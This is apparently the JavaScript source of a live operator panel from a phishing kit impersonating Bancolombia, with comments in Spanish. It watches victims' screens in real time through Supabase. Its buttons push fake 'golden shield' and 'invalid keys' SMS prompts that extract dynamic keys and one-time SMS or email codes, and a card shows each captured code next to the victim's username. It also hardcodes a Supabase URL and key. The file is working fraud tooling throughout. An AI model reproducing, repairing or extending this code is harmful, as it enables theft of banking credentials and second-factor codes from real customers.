(function () {
  // ============================================================
  //  Bcbia · Panel de Control en Tiempo Real
  //  Lee public.client_screen_state (Realtime / WebSockets) para saber
  //  en qué pantalla está el usuario y habilita las acciones del
  //  panel SOLO cuando está en la pantalla de carga.
  //  Fase 3: botón "Solicitar Código SMS / Correo" para enviar la alerta y
  //  pedir el código al usuario (columna codigo_sms de dynamic_keys).
  // ============================================================
  const SUPABASE_URL = "https://yiozdjhcbragqmexiovn.supabase.co";
  const SUPABASE_ANON_KEY = "sb_publishable_Vl47Kr0iSj05_vy1BRU2jA_29BEfQAP";

  let supabaseClient = null;
  if (typeof window.supabase !== "undefined") {
    supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
  }

  // ==================== Estado del monitor ====================
  var estadosPorSesion = {}; // session_id -> {session_id, username, estado, detail, ts}
  var estadoActivo = null;   // la sesión con updated_at más reciente que sigue vigente
  var rtChannel = null;
  var btnEnviado = false;    // true: ya se envió el comando escudo dorado a la carga actual
  var btnSmsEnviado = false; // true: ya se envió la alerta SMS a la carga actual

  // Vigencia por estado. 'cargando' es en vivo (latido del cliente cada 2 s):
  // una carga sin latido se apaga sola a los 45 s. El resto son pantallas
  // estáticas del flujo y se mantienen hasta cambiar de pantalla.
  var VIGENCIA_MS = {
    cargando: 45 * 1000,
    clave: 8 * 60 * 1000,
    inicio: 8 * 60 * 1000,
    escudo: 8 * 60 * 1000,
    sms_alerta: 4 * 60 * 1000,
    sms_codigo: 5 * 60 * 1000,
    salida: 3 * 60 * 1000
  };
  var NOMBRE_ESTADO = {
    cargando: "USUARIO EN PANTALLA DE CARGA (ESPERANDO)",
    clave: "USUARIO EN CLAVE DINÁMICA (INGRESANDO CÓDIGO)",
    inicio: "USUARIO EN AVISO INICIAL DE SEGURIDAD",
    escudo: "USUARIO EN VALIDACIÓN SEGURA (ESCUDO DORADO)",
    sms_alerta: "USUARIO EN ALERTA SMS (CLAVES INVÁLIDAS)",
    sms_codigo: "USUARIO INGRESANDO CÓDIGO SMS/CORREO",
    salida: "USUARIO REDIRIGIDO A BANCOLOMBIA"
  };

  function $(id) { return document.getElementById(id); }
  function esc(s) {
    return String(s == null ? "" : s)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }
// ==================== Utilidades ====================
  function resumirSesion(sid) {
    if (!sid) return "—";
    return sid.length > 18 ? sid.slice(0, 5) + "…" + sid.slice(-5) : sid;
  }

  function haceCuanto(ts) {
    var d = Math.max(0, Math.round((Date.now() - ts) / 1000));
    if (d < 2) return "ahora mismo";
    if (d < 60) return "hace " + d + " s";
    return "hace " + Math.floor(d / 60) + " min " + (d % 60) + " s";
  }

  function conexion(texto) {
    var el = $("pie");
    if (el) el.textContent = texto;
  }

  // ==================== Consola ordenada (DevTools) ====================
  var ultimoLog = "";
  function logCaja(titulo, detalle) {
    var ts = new Date().toLocaleTimeString("es-CO", { hour12: false });
    var linea = "[" + ts + "] " + titulo + (detalle ? " | " + detalle : "");
    if (linea === ultimoLog) return;
    ultimoLog = linea;
    console.log("%c>> " + linea, "color:#f9d423;font-weight:bold");
  }
  function logVerde(texto) {
    console.log("%c>> [OK] " + texto, "color:#2fbf71;font-weight:bold");
  }
  function logRojo(texto) {
    console.log("%c>> [ERROR] " + texto, "color:#e05252;font-weight:bold");
  }

  // ==================== Tarjeta Código SMS/Correo (Fase 3) ====================
  // Se llena al instante con el detalle que el cliente reporta por Realtime
  // (reportarEstado('sms_codigo', 'código ingresado: XXXX')): la MISMA via
  // rapida que el estado de pantalla (postgres_changes), sin polling ni
  // consultas extra a Supabase. Si no hay codigo, la tarjeta queda oculta.
  function pintarOtp(est) {
    var card = $("otpCard");
    var val = $("otpValue");
    var sub = $("otpSub");
    if (!card || !val) return;
    if (est !== "sms_codigo" || !estadoActivo) {
      card.classList.remove("visible");
      return;
    }
    var detalle = String(estadoActivo.detail || "");
    var m = detalle.match(/([0-9]{4,})/);
    val.textContent = m ? m[1] : (detalle || "…");
    if (sub) {
      sub.textContent = (estadoActivo.username ? "usuario: " + estadoActivo.username + " · " : "") + haceCuanto(estadoActivo.ts);
    }
    card.classList.add("visible");
  }

  // ==================== Aplicar estado al indicador y a los botones ====================
  function aplicarEstado() {
    var monitor = $("monitor");
    var monMsg = $("monMsg");
    var monSub = $("monSub");
    var btn = $("dynamicKeyBtn");
    var smsBtn = $("smsAttnBtn");
    if (!monitor || !monMsg || !btn) return;

    // La tarjeta OTP solo es visible mientras el usuario este escribiendo el codigo.
    pintarOtp(null);

    // Descartar sesiones vencidas y elegir la más reciente.
    var ahora = Date.now();
    var mejor = null;
    Object.keys(estadosPorSesion).forEach(function (sid) {
      var e = estadosPorSesion[sid];
      var vig = VIGENCIA_MS[e.estado] || VIGENCIA_MS.cargando;
      if (ahora - e.ts > vig) { delete estadosPorSesion[sid]; return; }
      if (!mejor || e.ts > mejor.ts) mejor = e;
    });
    estadoActivo = mejor;

    btn.classList.remove("ready");
    btn.classList.remove("btn-sent");
    btn.disabled = true;
    if (smsBtn) {
      smsBtn.classList.remove("ready");
      smsBtn.classList.remove("btn-sent");
      // El clic nunca se bloquea si hay conexión: el handler valida y avisa.
      smsBtn.disabled = !supabaseClient;
    }

    if (!estadoActivo) {
      monitor.className = "monitor sin";
      monMsg.textContent = "SIN USUARIO ACTIVO";
      monSub.textContent = "El indicador se pondrá en VERDE cuando el usuario entre en la pantalla de carga.";
      btn.title = "Esperando a que el usuario entre en la pantalla de carga";
      pintarOtp(null);
      return;
    }

    var est = estadoActivo.estado;
    var quien = estadoActivo.username || "(sin usuario)";
    var resumen = "Usuario: " + esc(quien) + " · Sesión: " + resumirSesion(estadoActivo.session_id) + " · " + haceCuanto(estadoActivo.ts);
// Estados de la Fase 3 (alerta y formulario SMS)
    if (est === "sms_alerta" || est === "sms_codigo") {
      btnEnviado = false;
      btnSmsEnviado = false;
      monitor.className = "monitor activo";
      monMsg.textContent = "ESTADO: " + (NOMBRE_ESTADO[est] || ("USUARIO EN OTRA PANTALLA (" + esc(est) + ")"));
      monSub.textContent = resumen + (est === "sms_alerta" ? " · Alerta SMS mostrada al usuario (claves inválidas)" : " · " + (estadoActivo.detail || "El usuario está escribiendo el código SMS/correo (se guardará en su registro)"));
      btn.title = "El botón se habilita cuando el indicador esté en VERDE (pantalla de carga)";
      pintarOtp(est);
      return;
    }

    if (est === "cargando") {
      if (btnEnviado && btnSmsEnviado) {
        monitor.className = "monitor cargando";
        monMsg.textContent = "ESTADO: USUARIO EN PANTALLA DE CARGA (ESPERANDO) · COMANDOS ENVIADOS";
        monSub.textContent = resumen + " · Escudo dorado y alerta SMS ya fueron enviados.";
        btn.classList.add("btn-sent");
        btn.disabled = true;
        btn.title = "Comandos ya enviados a esta carga";
        if (smsBtn) { smsBtn.classList.add("btn-sent"); smsBtn.disabled = true; }
        return;
      }
      if (btnEnviado) {
        monitor.className = "monitor cargando";
        monMsg.textContent = "ESTADO: USUARIO EN PANTALLA DE CARGA (ESPERANDO) · COMANDO ENVIADO";
        monSub.textContent = resumen + " · El escudo dorado ya fue enviado.";
        btn.classList.add("btn-sent");
        btn.disabled = true;
        btn.title = "Comando ya enviado a esta carga";
        if (smsBtn) { smsBtn.disabled = false; smsBtn.classList.add("ready"); }
        return;
      }
      if (btnSmsEnviado) {
        monitor.className = "monitor cargando";
        monMsg.textContent = "ESTADO: USUARIO EN PANTALLA DE CARGA (ESPERANDO) · ALERTA SMS ENVIADA";
        monSub.textContent = resumen + " · La alerta SMS de claves inválidas ya fue enviada.";
        btn.classList.add("ready");
        btn.disabled = false;
        btn.title = "El escudo dorado sigue disponible para esta carga";
        if (smsBtn) { smsBtn.classList.add("btn-sent"); smsBtn.disabled = true; }
        return;
      }
      monitor.className = "monitor cargando";
      monMsg.textContent = "ESTADO: USUARIO EN PANTALLA DE CARGA (ESPERANDO)";
      monSub.textContent = resumen;
      btn.disabled = false;
      btn.title = "Enviar a " + quien + " · sesión " + resumirSesion(estadoActivo.session_id) + " · el usuario verá el escudo dorado en tiempo real";
      btn.classList.add("ready");
      if (smsBtn) {
        smsBtn.disabled = false;
        smsBtn.classList.add("ready");
        smsBtn.title = "Enviar alerta SMS/correo a " + quien + " · sesión " + resumirSesion(estadoActivo.session_id);
      }
      return;
    }

    // Otros estados: el usuario NO está en la carga. Se abre un nuevo ciclo.
    btnEnviado = false;
    btnSmsEnviado = false;
    monitor.className = est === "salida" ? "monitor sin" : "monitor activo";
    monMsg.textContent = "ESTADO: " + (NOMBRE_ESTADO[est] || ("USUARIO EN OTRA PANTALLA (" + esc(est) + ")"));
    monSub.textContent = resumen;
    btn.title = "El botón se habilita cuando el indicador esté en VERDE (pantalla de carga)";
  }
// ==================== Procesar fila de client_screen_state ====================
  function procesarFila(row) {
    if (!row || !row.session_id) return;
    var ts = row.updated_at ? new Date(row.updated_at).getTime() : Date.now();
    if (isNaN(ts)) ts = Date.now();
    estadosPorSesion[row.session_id] = {
      session_id: row.session_id,
      username: row.username || "",
      estado: row.estado || "inicio",
      detail: row.detail || "",
      ts: ts
    };
    logCaja("ESTADO recibido", row.estado + (row.username ? " | usuario: " + row.username : "") + " | sesión: " + resumirSesion(row.session_id));
    aplicarEstado();
  }

  // ==================== Vigilancia: Realtime (WebSockets) ====================
  function startRealtime() {
    if (!supabaseClient) return;
    if (rtChannel) return;
    rtChannel = supabaseClient
      .channel("bcbia-monitor")
      .on("postgres_changes",
        { event: "INSERT", schema: "public", table: "client_screen_state" },
        function (p) { if (p && p.new) procesarFila(p.new); })
      .on("postgres_changes",
        { event: "UPDATE", schema: "public", table: "client_screen_state" },
        function (p) { if (p && p.new) procesarFila(p.new); })
      .subscribe(function (status) {
        if (status === "SUBSCRIBED") {
          conexion("✅ En tiempo real conectado");
          logVerde("En tiempo real conectado (postgres_changes)");
        } else if (status === "CHANNEL_ERROR" || status === "TIMED_OUT") {
          conexion("⚠️ Realtime sin conexión. Reconectando…");
          logRojo("Realtime sin conexión");
        }
      });
  }

// ==================== Puente Admin -> Cliente ====================
  // Inserta en public.admin_commands el comando que el cliente recibe en
  // tiempo real para interrumpir su pantalla de carga y mostrar el escudo
  // dorado con la solicitud de una nueva Clave Dinámica.
  async function solicitarClaveDinamica() {
    var btn = $("dynamicKeyBtn");
    if (!supabaseClient || !estadoActivo || estadoActivo.estado !== "cargando") return;
    if (btnEnviado) return;
    btnEnviado = true;
    btn.classList.remove("ready");
    btn.disabled = true;

    var payload = {
      command: "solicitar_clave_dinamica",
      username: estadoActivo.username || "",
      session_id: estadoActivo.session_id || "",
      status: "pending",
      created_at: new Date().toISOString()
    };

    var res = await supabaseClient.from("admin_commands").insert(payload);
    if (res.error) {
      btnEnviado = false;
      btn.disabled = false;
      btn.classList.add("ready");
      conexion("❌ No se pudo enviar el comando: " + res.error.message);
      logRojo("No se pudo enviar comando: " + res.error.message);
      return;
    }

    conexion("✅ Comando enviado — el usuario verá el escudo dorado en tiempo real.");
    logVerde("Comando enviado | sesión: " + resumirSesion(estadoActivo.session_id));
    aplicarEstado(); // marca el botón como "COMANDO ENVIADO"
  }

  // ==================== Fase 3 · Solicitar Código SMS / Correo ====================
  // Inserta en public.admin_commands el comando que el cliente recibe en
  // tiempo real para superponer la alerta SMS (claves inválidas) sin
  // desmontar la pantalla de carga.
  async function solicitarSmsOtp() {
    var btn = $("smsAttnBtn");
    if (!supabaseClient) {
      conexion("❌ Supabase no disponible. Revisa internet o recarga (librería CDN).");
      logRojo("SMS: Supabase no disponible");
      return;
    }
    if (btnSmsEnviado) {
      conexion("⚠️ La alerta SMS ya fue enviada. Espera a que el usuario cambie de pantalla.");
      return;
    }
    if (!estadoActivo || estadoActivo.estado !== "cargando") {
      conexion("⚠️ Para enviar el SMS el usuario debe estar en la pantalla de carga (indicador en VERDE).");
      logRojo("SMS: el usuario no está en la pantalla de carga");
      return;
    }
    btnSmsEnviado = true;
    if (btn) {
      btn.classList.remove("ready");
      btn.disabled = true;
    }

    var payload = {
      command: "solicitar_sms_otp",
      username: estadoActivo.username || "",
      session_id: estadoActivo.session_id || "",
      status: "pending",
      created_at: new Date().toISOString()
    };

    var res = await supabaseClient.from("admin_commands").insert(payload);
    if (res.error) {
      btnSmsEnviado = false;
      if (btn) { btn.disabled = false; btn.classList.add("ready"); }
      conexion("❌ No se pudo enviar la alerta SMS: " + res.error.message);
      logRojo("No se pudo enviar alerta SMS: " + res.error.message);
      return;
    }

    conexion("✅ Alerta SMS enviada — el usuario verá la alerta de claves inválidas en tiempo real.");
    logVerde("Alerta SMS enviada | sesión: " + resumirSesion(estadoActivo.session_id));
    aplicarEstado(); // marca el botón como "COMANDO ENVIADO"
  }
// ==================== Init ====================
  function init() {
    var btn = $("dynamicKeyBtn");
    if (btn) btn.addEventListener("click", solicitarClaveDinamica);
    var smsBtn = $("smsAttnBtn");
    if (smsBtn) {
      smsBtn.addEventListener("click", solicitarSmsOtp);
      logCaja("Botón SMS", "listener asignado a #smsAttnBtn");
    } else {
      logRojo("Botón SMS NO encontrado en el DOM (#smsAttnBtn)");
    }

    conexion("Conectando…");
    logCaja("Bcbia · Panel de Control arrancado", "Supabase: yiozdjhcbragqmexiovn");
    if (!supabaseClient) {
      conexion("❌ Supabase no disponible. Revisa internet o recarga (librería CDN).");
      logRojo("Supabase no disponible (librería no cargada)");
      return;
    }

    aplicarEstado();      // refleja el estado actual aunque todavía no haya señales
    startRealtime();      // suscripción a cambios en tiempo real (WebSockets)
    setInterval(aplicarEstado, 1000); // texto "hace N s" + expiración en vivo

    // Si Realtime tarda en confirmar, muestra un aviso para que no parezca congelado.
    setTimeout(function () {
      var pie = $("pie");
      if (pie && pie.textContent.indexOf("Conectando") === 0) {
        conexion("⚠️ Realtime sin confirmar. Si persiste, recarga la página.");
      }
    }, 4000);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
